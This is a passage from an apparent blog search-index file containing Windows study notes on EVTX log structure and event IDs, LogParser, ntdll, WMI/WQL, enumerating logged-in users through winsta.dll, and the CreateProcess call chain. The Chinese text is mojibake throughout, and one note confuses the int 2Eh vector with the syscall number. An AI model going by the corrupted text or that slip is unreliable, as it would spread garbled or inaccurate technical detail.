ï¼ˆæ•°æ®å—ï¼‰ trailing empty values ï¼ˆå°¾éƒ¨å¡«å……ç©ºå€¼ï¼‰ File Headerï¼ˆæ–‡ä»¶å¤´ï¼‰ï¼š æ–‡ä»¶å¤´é•¿åº¦ä¸º4KBï¼ˆ4096bytesï¼‰ï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š åç§» é•¿åº¦ï¼ˆBytesï¼‰ å€¼ æè¿° 0x00 8 â€œElfFile\\x00â€ æ ‡å¿—ä½/ç­¾å 0x08 8 ç¬¬ä¸€ä¸ªåŒºå—ç¼–å·ï¼ˆå­˜åœ¨æ—¶é—´æœ€ä¹…çš„åŒºå—ç¼–å·ï¼‰ 0x10 8 å½“å‰åŒºå—ç¼–å·ï¼ˆå—çš„ç¼–å·ä»0å¼€å§‹ï¼‰ 0x18 8 ä¸‹ä¸€æ¡äº‹ä»¶è®°å½•çš„ID 0x20 4 128 æ–‡ä»¶å¤´æœ‰æ•ˆéƒ¨åˆ†çš„å¤§å° 0x24 2 1 æ¬¡è¦ç‰ˆæœ¬ 0x26 2 3 ä¸»è¦ç‰ˆæœ¬ 0x28 2 4096 æ–‡ä»¶å¤´çš„å¤§å° 0x2A 2 åŒºå—çš„æ•°é‡ 0x2C 76 æœªçŸ¥ (ç©ºå€¼) 0x78 4 æ–‡ä»¶æ ‡å¿— 0x7C 4 æ–‡ä»¶å¤´å‰ 120 bytes çš„CRC32æ ¡éªŒå’Œ 0x80 3968 æœªçŸ¥ (ç©ºå€¼) Chunk(å—)ï¼š æ¯ä¸ªå—çš„å¤§å°æ˜¯ 65536 bytesï¼ˆ64KBï¼‰ï¼Œä¸»è¦ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼š chunk header å—å¤´ array of event records äº‹ä»¶è®°å½•ç»„ unused space æœªä½¿ç”¨çš„ç©ºé—´ chunkå¤´é•¿åº¦ä¸º512bytesï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š åç§» é•¿åº¦ï¼ˆBytesï¼‰ å€¼ æè¿° 0x00 8 â€œElfChnk\\x00â€ æ ‡å¿—ä½/ç­¾å 0x08 8 åŸºäºæ—¥å¿—ç¼–å·çš„ç¬¬ä¸€æ¡æ—¥å¿—è®°å½•çš„ID 0x10 8 åŸºäºæ—¥å¿—ç¼–å·çš„æœ€åä¸€æ¡æ—¥å¿—è®°å½•çš„ID 0x18 8 åŸºäºæ–‡ä»¶ç¼–å·çš„ç¬¬ä¸€æ¡æ—¥å¿—è®°å½•çš„ID 0x20 8 åŸºäºæ–‡ä»¶ç¼–å·çš„æœ€åä¸€æ¡æ—¥å¿—è®°å½•çš„ID 0x28 4 128 chunkå¤´å¤§å° 0x2C 4 æœ€åä¸€æ¡æ—¥å¿—è®°å½•çš„åç§»é‡ï¼ˆç›¸å¯¹äºå—å¤´çš„èµ·å§‹åç§»é‡ï¼‰ 0x30 4 ä¸‹ä¸€æ¡æ—¥å¿—è®°å½•çš„åç§»é‡ï¼ˆç›¸å¯¹äºå—å¤´çš„èµ·å§‹åç§»é‡ï¼‰ 0x34 4 äº‹ä»¶è®°å½•æ•°æ®çš„ CRC32 æ ¡éªŒå’Œ 0x38 64 Unknown (ç©ºå€¼) 0x78 4 Unknown (flags?) 0x7C 4 å—å¤´CRC32æ ¡éªŒå’Œï¼ˆå—å¤´å‰120ä¸ªå­—èŠ‚å’Œ128è‡³512å­—èŠ‚çš„æ•°æ®çš„CRC32æ ¡éªŒå’Œï¼‰ Event record(äº‹ä»¶è®°å½•)ï¼š äº‹ä»¶è®°å½•çš„é•¿åº¦éå›ºå®šé•¿åº¦ï¼Œå…¶ç»“æ„å¦‚ä¸‹ï¼š åç§» é•¿åº¦ï¼ˆBytesï¼‰ å€¼ æè¿° 0x00 4 â€œ\\x2a\\x2a\\x00\\x00â€ æ ‡å¿—ä½/ç­¾å 0x04 4 äº‹ä»¶è®°å½•çš„é•¿åº¦ 0x08 8 è®°å½•ID 0x10 8 æ—¥å¿—è®°å½•çš„å†™å…¥æ—¶é—´ï¼ˆFILETIMEï¼‰ 0x18 ä¸ç¡®å®š åŸºäºäºŒè¿›åˆ¶XMLç¼–ç çš„ä¿¡æ¯ ä¸ç¡®å®š 4 è®°å½•é•¿åº¦ï¼ˆå‰¯æœ¬ï¼‰ ç”±ä¸Šé¢çš„ä¿¡æ¯ï¼Œå¯çŸ¥evtxæ—¥å¿—æ–‡ä»¶åŒ…å«ä¸€ä¸ª4KBçš„æ–‡ä»¶å¤´åŠ åé¢ä¸€å®šæ•°é‡çš„64KBå¤§å°çš„å—ï¼Œä¸€ä¸ªå—ä¸­è®°å½•ä¸€å®šæ•°é‡ï¼ˆå¤§çº¦100æ¡ï¼‰çš„äº‹ä»¶è®°å½•ã€‚æ¯ä¸ªå—æ˜¯ç‹¬ç«‹çš„ï¼Œä¸å—å…¶ä»–å—å½±å“ã€‚ä¸ä¼šå‡ºç°ä¸€æ¡äº‹ä»¶è®°å½•çš„æ•°æ®å­˜åœ¨äºä¸¤ä¸ªå—ä¸­ã€‚æ¯æ¡è®°å½•åŒ…å«ä¸€ä¸ªåŸºäºäºŒè¿›åˆ¶XMLç¼–ç çš„ä¿¡æ¯ã€‚æ¯æ¡äº‹ä»¶è®°å½•åŒ…å«å…¶åˆ›å»ºæ—¶é—´ä¸äº‹ä»¶ IDï¼ˆå¯ä»¥ç”¨äºç¡®å®šäº‹ä»¶çš„ç§ç±»ï¼‰ï¼Œå› æ­¤å¯ä»¥åæ˜ æŸä¸ªç‰¹å®šçš„æ—¶é—´å‘ç”Ÿçš„ç‰¹å®šçš„æ“ä½œï¼Œå–è¯äººå‘˜å¯ä»¥æ ¹æ®æ—¥å¿—æ–‡ä»¶æ¥å‘ç°çŠ¯ç½ªçš„è¿‡ç¨‹ã€‚ evtxæ—¥å¿—æ–‡ä»¶å¤§æ¦‚çš„ç»“æ„å¦‚ä¸‹æ‰€ç¤ºï¼š EVTXæ–‡ä»¶çš„å­˜å‚¨ Windowsäº‹ä»¶æ—¥å¿—æ–‡ä»¶ä¿å­˜åœ¨%SystemRoot%\\System32\\Winevt\\Logsè·¯å¾„ä¸­ã€‚ å¸¸è§æ—¥å¿—æ–‡ä»¶ä¸»è¦æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯ï¼šSystem.evtx ã€Application.evtx å’ŒSecurity.evtxã€‚åˆ†åˆ«æ˜¯ç³»ç»Ÿæ—¥å¿—ã€åº”ç”¨ç¨‹åºæ—¥å¿—å’Œå®‰å…¨æ—¥å¿—ã€‚ System.evtx è®°å½•æ“ä½œç³»ç»Ÿè‡ªèº«ç»„ä»¶äº§ç”Ÿçš„æ—¥å¿—äº‹ä»¶ï¼Œæ¯”å¦‚é©±åŠ¨ã€ç³»ç»Ÿç»„ä»¶å’Œåº”ç”¨è½¯ä»¶çš„å´©æºƒä»¥åŠæ•°æ®ä¸¢å¤±é”™è¯¯ç­‰ç­‰ã€‚ Application.evtx è®°å½•åº”ç”¨ç¨‹åºæˆ–ç³»ç»Ÿç¨‹åºè¿è¡Œæ–¹é¢çš„æ—¥å¿—äº‹ä»¶ï¼Œæ¯”å¦‚æ•°æ®åº“ç¨‹åºå¯ä»¥åœ¨åº”ç”¨ç¨‹åºæ—¥å¿—ä¸­è®°å½•æ–‡ä»¶é”™è¯¯ï¼Œåº”ç”¨çš„å´©æºƒè®°å½•ç­‰ã€‚ Security.evtx è®°å½•ç³»ç»Ÿçš„å®‰å…¨å®¡è®¡æ—¥å¿—äº‹ä»¶ï¼Œæ¯”å¦‚ç™»å½•äº‹ä»¶ã€å¯¹è±¡è®¿é—®ã€è¿›ç¨‹è¿½è¸ªã€ç‰¹æƒè°ƒç”¨ã€å¸å·ç®¡ç†ã€ç­–ç•¥å˜æ›´ç­‰ã€‚Security.evtxä¹Ÿæ˜¯å–è¯ä¸­æœ€å¸¸ç”¨åˆ°çš„ã€‚ é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ä¸€ä¸ªevtxæ–‡ä»¶çš„è®°å½•æ»¡äº†ï¼Œæ—¥å¿—æœåŠ¡ä¼šè¦†ç›–æœ€å¼€å§‹çš„è®°å½•ï¼Œä»å¤´å¼€å§‹å†™å…¥æ–°çš„è®°å½•ã€‚ä¹Ÿå°±æ˜¯ç›¸å½“äºä¸€ä¸ªå¾ªç¯è®°å½•çš„ç¼“å­˜æ–‡ä»¶ã€‚ Evtxæ—¥å¿—åˆ†æ Windows ç”¨ Event IDæ¥æ ‡è¯†äº‹ä»¶çš„ä¸åŒå«ä¹‰ï¼Œæ‹¿Securityæ—¥å¿—æ¥è¯´ï¼Œä¸€äº›å¸¸è§çš„Event ID å¦‚ä¸‹ï¼š äº‹ä»¶ID æè¿° 4608 Windows å¯åŠ¨ 4609 Windows å…³æœº 4616 ç³»ç»Ÿæ—¶é—´å‘ç”Ÿæ›´æ”¹ 4624 ç”¨æˆ·æˆåŠŸç™»å½•åˆ°è®¡ç®—æœº 4625 ç™»å½•å¤±è´¥ã€‚ä½¿ç”¨æœªçŸ¥ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯çš„å·²çŸ¥ç”¨æˆ·åå°è¯•ç™»å½•ã€‚ 4634 ç”¨æˆ·æ³¨é”€å®Œæˆ 4647 ç”¨æˆ·å¯åŠ¨äº†æ³¨é”€è¿‡ç¨‹ 4648 ç”¨æˆ·åœ¨ä»¥å…¶ä»–ç”¨æˆ·èº«ä»½ç™»å½•æ—¶ï¼Œä½¿ç”¨æ˜¾å¼å‡­æ®æˆåŠŸç™»å½•åˆ°è®¡ç®—æœº 4703 ä»¤ç‰Œæƒé™è°ƒæ•´ 4704 åˆ†é…äº†ç”¨æˆ·æƒé™ 4720 å·²åˆ›å»ºç”¨æˆ·è´¦æˆ· 4725 è´¦æˆ·è¢«ç¦ç”¨ 4768 è¯·æ±‚Kerberosèº«ä»½éªŒè¯ç¥¨è¯ï¼ˆTGTï¼‰ 4769 è¯·æ±‚KerberosæœåŠ¡ç¥¨è¯ 4770 å·²ç»­è®¢KerberosæœåŠ¡ç¥¨è¯ 4779 ç”¨æˆ·åœ¨æœªæ³¨é”€çš„æƒ…å†µä¸‹æ–­å¼€äº†ç»ˆç«¯æœåŠ¡å™¨ä¼šè¯ 1ã€é€šè¿‡Windowsäº‹ä»¶æŸ¥çœ‹å™¨åˆ†ææ—¥å¿— é€šè¿‡Windowsäº‹ä»¶æŸ¥çœ‹å™¨å¯ä»¥æŸ¥çœ‹å½“å‰ä¸»æœºçš„äº‹ä»¶æ—¥å¿—ï¼Œä¹Ÿå¯ä»¥æ‰“å¼€ä¿å­˜çš„ evtxæ–‡ä»¶ã€‚ å¯ä»¥é€šè¿‡ç‚¹å‡»ã€ç­›é€‰ã€æŸ¥æ‰¾ç­‰å¤šç§æ–¹å¼æŸ¥çœ‹äº‹ä»¶æ—¥å¿— ç­›é€‰å™¨æä¾›äº†ä¸°å¯Œçš„ç­›é€‰æ–¹å¼ï¼š 2ã€é€šè¿‡å·¥å…·åˆ†æEvtx Log Parser Log Parserï¼ˆæ˜¯å¾®è½¯å…¬å¸è‡ªå·±å¼€å‘çš„æ—¥å¿—åˆ†æå·¥å…·ï¼Œå®ƒåŠŸèƒ½å¼ºå¤§ï¼Œä½¿ç”¨ç®€å•ï¼Œå¯ä»¥åˆ†æåŸºäºæ–‡æœ¬çš„æ—¥å¿—æ–‡ä»¶ã€XML æ–‡ä»¶ã€CSVï¼ˆé€—å·åˆ†éš”ç¬¦ï¼‰æ–‡ä»¶ï¼Œä»¥åŠæ“ä½œç³»ç»Ÿçš„äº‹ä»¶æ—¥å¿—ã€æ³¨å†Œè¡¨ã€æ–‡ä»¶ç³»ç»Ÿã€Active Directoryã€‚å®ƒä½¿ç”¨ç±»ä¼¼ SQL è¯­å¥ä¸€æ ·æŸ¥è¯¢åˆ†æè¿™äº›æ•°æ®ï¼Œè¿˜å¯ä»¥æŠŠåˆ†æç»“æœä»¥å›¾è¡¨çš„å½¢å¼å±•ç°å‡ºæ¥ã€‚ Log Parserä¸‹è½½åœ°å€ï¼šhttps://www.microsoft.com/en-us/download/details.aspx?id=24659 ä½¿ç”¨æ–¹æ³•: 1logparser -i:è¾“å…¥æ–‡ä»¶çš„æ ¼å¼ -o:è¾“å‡ºæ–‡ä»¶çš„æ ¼å¼ &quot;æŸ¥è¯¢è¯­å¥ å’Œæ–‡ä»¶è·¯å¾„&quot; ä¾‹å­ï¼š æŸ¥è¯¢ç™»å½•æˆåŠŸçš„äº‹ä»¶ï¼š 1LogParser.exe -i:EVT -o:DATAGRID &quot;SELECT * FROM E:\\Security.evtx where EventID=4624&quot; Log Parser Studio logparserçš„GUIç‰ˆæœ¬ã€‚ ä¸‹è½½åœ°å€ï¼šhttps://techcommunity.microsoft.com/t5/exchange-team-blog/log-parser-studio-2-0-is-now-available/ba-p/593266 å…¶ç•Œé¢å¦‚ä¸‹ï¼š LogParser Lizard LogParser Lizard æ˜¯ä¸€ä¸ªåŠŸèƒ½ä¸°å¯Œçš„Windows æ—¥å¿—åˆ†æè½¯ä»¶ï¼Œå¯ä»¥é€šè¿‡ç±»ä¼¼SQLæŸ¥è¯¢è¯­å¥å¯¹æ—¥å¿—ç­›é€‰æŸ¥è¯¢è¿›è¡Œåˆ†æã€‚ ä¸‹è½½åœ°å€ï¼šhttps://lizard-labs.com/log_parser_lizard.aspx","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"evtx","slug":"evtx","permalink":"https://hodlyounger.github.io/tags/evtx/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"æ–‡ä»¶ä¸ç»“æ„ä½“","slug":"A-OS/Windows/æ–‡ä»¶ä¸ç»“æ„ä½“","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E6%96%87%E4%BB%B6%E4%B8%8E%E7%BB%93%E6%9E%84%E4%BD%93/"}]},{"title":"ã€ntdllã€‘ntdllå¯¼å‡ºæ¥å£","date":"2024-01-23T06:09:09.460Z","path":"A_OS/Windows/ã€ntdllã€‘ntdllå¯¼å‡ºæ¥å£/","text":"æ¦‚è¿°ï¼šwindowsæ“ä½œç³»ç»Ÿ ntdll.dll å­¦ä¹ ç¬”è®° ntdllæ˜¯Windowsæ“ä½œç³»ç»Ÿæ ¸å¿ƒçš„ä¸€ä¸ªdllï¼Œé‡Œè¾¹é›†æˆäº†å¤§å¤šæ•° windows api æ‰€éœ€è¦çš„æ¥å£ã€‚å­¦ä¹  ntdll æœ‰åŠ©äºæˆ‘ä»¬å¿«é€Ÿäº†è§£ windows APIã€‚ 0x01ã€è®¤è¯† ntdll ä½¿ç”¨ä¸‰æ–¹å·¥å…·å¯ä»¥çœ‹åˆ°ï¼Œntdllçš„å¯¼å‡ºå‡½æ•°æœ‰ä¸¤åƒå¤šä¸ªï¼Œä»åŸºæœ¬çš„è¾“å…¥è¾“å‡ºåˆ°å†…å­˜æ“ä½œéƒ½è¦†ç›–ã€‚æœ¬æ–‡ä¸»è¦è®°å½•åœ¨å·¥ä½œå­¦ä¹ ä¸­ä½¿ç”¨åˆ°çš„ç›¸å…³å¯¼å‡ºæ¥å£ï¼Œç”¨å¤šå°‘å†™å¤šå°‘ã€‚ 0x02ã€å¯¼å‡ºæ¥å£è¯´æ˜ ntdllå¯¼å‡ºæ¥å£è¯´æ˜ 2024å¹´8æœˆ1æ—¥09:27:57 æ›´æ–° é™¤äº†å¯¼å‡ºæ¥å£ï¼Œä¹Ÿåº”è¯¥äº†è§£åˆ°ç³»ç»Ÿè°ƒç”¨è¡¨","tags":[{"name":"ntdll","slug":"ntdll","permalink":"https://hodlyounger.github.io/tags/ntdll/"},{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"windows/ntdll","slug":"windows-ntdll","permalink":"https://hodlyounger.github.io/tags/windows-ntdll/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"}]},{"title":"ã€COMã€‘WQLä½¿ç”¨åŠå…¶æµ‹è¯•å·¥å…·","date":"2024-01-23T06:08:51.926Z","path":"A_OS/Windows/COM/ã€COMã€‘WQL/","text":"æ¦‚è¿°ï¼šwindows wmiçš„ä½¿ç”¨ ç›¸å…³é“¾æ¥ï¼š WMI C++ åº”ç”¨ç¨‹åºç¤ºä¾‹ - Win32 apps | Microsoft Learn holdyounger/WMI-RecvEventNotify: wmiçš„é€šçŸ¥æŸ¥è¯¢ ä½¿ç”¨ WMI - Win32 apps | Microsoft Learn 0x01 å·¥å…· ä½¿ç”¨ Windows è‡ªå¸¦çš„ WbemTest å³å¯ã€‚ WQLçš„ä½¿ç”¨","tags":[{"name":"Windows","slug":"Windows","permalink":"https://hodlyounger.github.io/tags/Windows/"},{"name":"Windows/WQL","slug":"Windows-WQL","permalink":"https://hodlyounger.github.io/tags/Windows-WQL/"},{"name":"Windows/WMI","slug":"Windows-WMI","permalink":"https://hodlyounger.github.io/tags/Windows-WMI/"},{"name":"Windows/COM","slug":"Windows-COM","permalink":"https://hodlyounger.github.io/tags/Windows-COM/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"COM","slug":"A-OS/Windows/COM","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/COM/"}]},{"title":"ã€winapiã€‘è·å–å½“å‰ç™»å½•ç”¨æˆ·","date":"2024-01-23T06:08:51.916Z","path":"A_OS/Windows/API/ã€winapiã€‘è·å–å½“å‰ç™»å½•ç”¨æˆ·/","text":"æ¦‚è¿°ï¼šè°ƒç”¨ winsta.dll å¯¼å‡ºæ¥å£è·å–ç³»ç»Ÿå½“å‰ç™»å½•çš„ç”¨æˆ· ç›¸å…³æšä¸¾ 1234567891011121314151617181920212223242526272829303132333435363738394041424344typedef enum _WINSTATIONINFOCLASS&#123; WinStationCreateData, WinStationConfiguration, WinStationPdParams, WinStationWd, WinStationPd, WinStationPrinter, WinStationClient, WinStationModules, WinStationInformation, WinStationTrace, WinStationBeep, WinStationEncryptionOff, WinStationEncryptionPerm, WinStationNtSecurity, WinStationUserToken, WinStationUnused1, WinStationVideoData, WinStationInitialProgram, WinStationCd, WinStationSystemTrace, WinStationVirtualData, WinStationClientData, WinStationSecureDesktopEnter, WinStationSecureDesktopExit, WinStationLoadBalanceSessionTarget, WinStationLoadIndicator, WinStationShadowInfo, WinStationDigProductId, WinStationLockedState, WinStationRemoteAddress, WinStationIdleTime, WinStationLastReconnectType, WinStationDisallowAutoReconnect, WinStationUnused2, WinStationUnused3, WinStationUnused4, WinStationUnused5, WinStationReconnectedFromId, WinStationEffectsPolicy, WinStationType, WinStationInformationEx&#125; WINSTATIONINFOCLASS; ç›¸å…³ç»“æ„ä½“ 123456789101112131415161718192021222324typedef struct _SESSIONIDW &#123; union &#123; ULONG SessionId; ULONG LogonId; &#125; _SessionId_LogonId_union; WINSTATIONNAME WinStationName; WINSTATIONSTATECLASS State;&#125; SESSIONIDW,*PSESSIONIDW;typedef struct _WINSTATIONINFORMATIONW &#123; WINSTATIONSTATECLASS ConnectState; WINSTATIONNAME WinStationName; ULONG LogonId; LARGE_INTEGER ConnectTime; LARGE_INTEGER DisconnectTime; LARGE_INTEGER LastInputTime; LARGE_INTEGER LogonTime; PROTOCOLSTATUS Status; WCHAR Domain[DOMAIN_LENGTH + 1]; WCHAR UserName[USERNAME_LENGTH + 1]; LARGE_INTEGER CurrentTime;&#125; WINSTATIONINFORMATIONW,*PWINSTATIONINFORMATIONW; å¯¼å‡ºå‡½æ•°å®šä¹‰ 1234567typedef BOOL(WINAPI *pfn_WinStationEnumerateW)(_In_opt_ HANDLE hServer, _Out_ PSESSIONIDW *SessionIds, _Out_ PULONG Count);typedef BOOL(WINAPI *pfn_WinStationQueryInformationW)(_In_opt_ HANDLE hServer, _In_ ULONG SessionId, _In_ WINSTATIONINFOCLASS WinStationInformationClass, _Out_writes_bytes_(WinStationInformationLength) PVOID pWinStationInformation, _In_ ULONG WinStationInformationLength, _Out_ PULONG pReturnLength);typedef BOOL(WINAPI *pfn_WinStationFreeMemory)(_In_ PVOID Buffer); è·å–ç™»å½•ç”¨æˆ· 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485BOOL GetAllLoginUser(vector&lt;CString&gt;&amp; vecUser)&#123; BOOL bRet = FALSE; static pfn_WinStationEnumerateW pWinStationEnumerateW = NULL; static pfn_WinStationFreeMemory pWinStationFreeMemory = NULL; static pfn_WinStationQueryInformationW pWinStationQueryInformationW = NULL; static HMODULE hDll = NULL; if (pWinStationEnumerateW == NULL || pWinStationFreeMemory == NULL || pWinStationQueryInformationW == NULL) &#123; if (hDll == NULL) &#123;#ifdef QHGetCurrentModuleHandleForCheckSign hDll = LoadLibrary_api_s(L&quot;winsta.dll&quot;);#else hDll = LoadLibrary(L&quot;winsta.dll&quot;);#endif // LoadLibrary_api_s &#125; if (hDll) &#123; pWinStationEnumerateW = (pfn_WinStationEnumerateW)GetProcAddress(hDll, &quot;WinStationEnumerateW&quot;); pWinStationFreeMemory = (pfn_WinStationFreeMemory)GetProcAddress(hDll, &quot;WinStationFreeMemory&quot;); pWinStationQueryInformationW = (pfn_WinStationQueryInformationW)GetProcAddress(hDll, &quot;WinStationQueryInformationW&quot;); &#125; if (pWinStationEnumerateW == NULL || pWinStationFreeMemory == NULL || pWinStationQueryInformationW == NULL) &#123; return FALSE; &#125; &#125; PSESSIONIDW pTerm = NULL; ULONG uTermCount = 0; /* DWORD dwSessionID = -1; BOOL bRet = ProcessIdToSessionId(GetCurrentProcessId(), &amp;dwSessionID); if (bRet == FALSE) &#123; return 0; &#125; */ do &#123; DWORD dwSize = sizeof(SESSIONIDW); bRet = pWinStationEnumerateW(NULL, &amp;pTerm, &amp;uTermCount); if (bRet == FALSE) &#123; break; &#125; for (ULONG i = 0; i &lt; uTermCount; ++i) &#123; WINSTATIONINFORMATIONW pStationInfo; ULONG uInfoLen = sizeof(WINSTATIONINFORMATIONW); ULONG uRetLen = 0; if (FALSE == pWinStationQueryInformationW(NULL, pTerm-&gt;_SessionId_LogonId_union.SessionId, WinStationInformation, &amp;pStationInfo, uInfoLen, &amp;uRetLen)) &#123; break; &#125; if (pStationInfo.UserName[0]) &#123; bRet = TRUE; vecUser.push_back(pStationInfo.UserName); //wprintf(L&quot;domain : %s, user : %s \\n&quot;, pStationInfo.Domain, pStationInfo.UserName); &#125; pTerm++; &#125; &#125; while (FALSE); if (pTerm) &#123; pWinStationFreeMemory(pTerm); &#125; return bRet;&#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"API","slug":"API","permalink":"https://hodlyounger.github.io/tags/API/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€winapiã€‘GetModuleHandle","date":"2024-01-23T06:08:51.910Z","path":"A_OS/Windows/API/ã€winapiã€‘GetModuleHandle/","text":"GetModuleHandle å‡½æ•°ç”¨æ³• å®šä¹‰å‡½æ•°åŸå‹ 1typedef BOOL(WINAPI *LPFN_GLPI)(PSYSTEM_LOGICAL_PROCESSOR_INFORMATION, PDWORD); è·å–å‡½æ•° 123456789101112LPFN_GLPI glpi;glpi = (LPFN_GLPI)GetProcAddress( GetModuleHandle(TEXT(&quot;kernel32&quot;)), &quot;GetLogicalProcessorInformation&quot;);if (NULL == glpi)&#123; DbgTrace(L&quot;[%s]GetLogicalProcessorInformation is not supported.\\n&quot;, __FUNCTIONW__);&#125;else&#123; DbgTrace(L&quot;[%s]GetLogicalProcessorInformation is supported.\\n&quot;, __FUNCTIONW__);&#125;","tags":[],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"API","slug":"A-OS/Windows/API","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/API/"}]},{"title":"ã€ã€‘ã€APIã€‘CreateProcess ä½¿ç”¨åŠè°ƒç”¨æµç¨‹","date":"2024-01-23T06:08:51.905Z","path":"A_OS/Windows/API/ã€winapiã€‘CreateProcess/","text":"æ¦‚è¿°ï¼šwindows CreateProcess è°ƒç”¨è¿‡ç¨‹è¯¦è§£ CreateProcess çš„ç³»ç»Ÿè°ƒç”¨æµç¨‹å‚è€ƒï¼š Making NtCreateUserProcess Work - Hack.Learn.Share CreateProcess å†…éƒ¨å®ç°-CSDNåšå®¢ ä½¿ç”¨è¯´æ˜ å‡½æ•°åŸå‹ 123456789101112131415WINBASEAPIBOOLWINAPICreateProcessW( _In_opt_ LPCWSTR lpApplicationName, _Inout_opt_ LPWSTR lpCommandLine, _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment, _In_opt_ LPCWSTR lpCurrentDirectory, _In_ LPSTARTUPINFOW lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation ); ä»¥ä¸ŠåŸå‹æ˜¯æˆ‘ä»¬åœ¨ç”¨æˆ·å±‚è°ƒç”¨æ—¶çš„æ¥å£ã€‚ å‚æ•°è¯´æ˜ å‚æ•°è¯´æ˜ç›´æ¥çœ‹å®˜ç½‘è¯´æ˜å°±è¡Œ CreateProcessA å‡½æ•° (processthreadsapi.h) - Win32 apps | Microsoft Learn Demo ã€DbgHelpã€‘é€šè¿‡PDBåœ¨PEä¸­æŸ¥æ‰¾å‡½æ•° ã€WinFileã€‘credwiz è°ƒç”¨æµç¨‹ ç”¨æˆ·å±‚çš„ CreateProcess è°ƒç”¨å¹¶ä¸æ˜¯ç›´æ¥è°ƒç”¨çš„ ntdll ä¸­çš„æ¥å£ã€‚è€Œæ˜¯ç»è¿‡å¤šæ¬¡è½¬å‘ï¼Œæœ€åé€šè¿‡ ntdll å‘å†…æ ¸å‘èµ·è°ƒç”¨ï¼Œè°ƒç”¨å †æ ˆå¤§è‡´å¦‚ä¸‹æ‰€ç¤ºï¼Œè¿™é‡Œäº†è§£å³å¯ã€‚ 1234[0x0] ntdll!NtCreateUserProcess 0xdf231fc698 0x7ff9da72b473 [0x1] KERNELBASE!CreateProcessInternalW+0xfe3 0xdf231fc6a0 0x7ff9da728a03 [0x2] KERNELBASE!CreateProcessAsUserW+0x63 0xdf231fdc70 0x7ff9daa4de30 [0x3] KERNEL32!CreateProcessAsUserWStub+0x60 0xdf231fdce0 0x7ff9d4a4526b åœ¨ syscall ä¹‹å‰ï¼Œæœ€ç»ˆè°ƒç”¨åˆ° ntdll ä¸­çš„ NtCrteateUserProcessã€‚ ntå±‚è°ƒç”¨ä»£ç  å¯ä»¥çœ‹åˆ°ç³»ç»Ÿè°ƒç”¨è¡¨çš„ ID ä¸º 0x2Eã€‚ 1234567891011__int64 NtCreateProcess()&#123; __int64 result; // rax result = 186i64; if ( (MEMORY[0x7FFE0308] &amp; 1) != 0 ) __asm &#123; int 2Eh; DOS 2+ internal - EXECUTE COMMAND &#125; else __asm &#123; syscall; Low latency system call &#125; // syscall å‘èµ·ç³»ç»Ÿè°ƒç”¨ return result;&#125; è¿™é‡Œä¹Ÿè¡¥å……ä¸‹ Kernel32 å’Œ kernelBase ä¸­çš„è°ƒç”¨ ä»ç”¨æˆ·å±‚ CreateProcess è°ƒç”¨å¼€å§‹ï¼š Kernel32 1234567891011121314151617181920212223242526BOOL __stdcall CreateProcessAsUserWStub( HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)&#123; return CreateProcessAsUserW( hToken, lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation);&#125; KernelBase CreateProcessAsUserW1234567891011121314151617181920212223242526BOOL __stdcall CreateProcessAsUserW( HANDLE hToken, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation)&#123;return CreateProcessInternalW( (_DWORD)hToken, (_DWORD)lpApplicationName, (_DWORD)lpCommandLine, (_DWORD)lpProcessAttributes, (__int64)lpThreadAttributes, bInheritHandles, dwCreationFlags, (__int64)lpEnvironment, (__int64)lpCurrentDirectory, (__int64)lpStartupInfo, (__int64)lpProcessInformation);&#125; 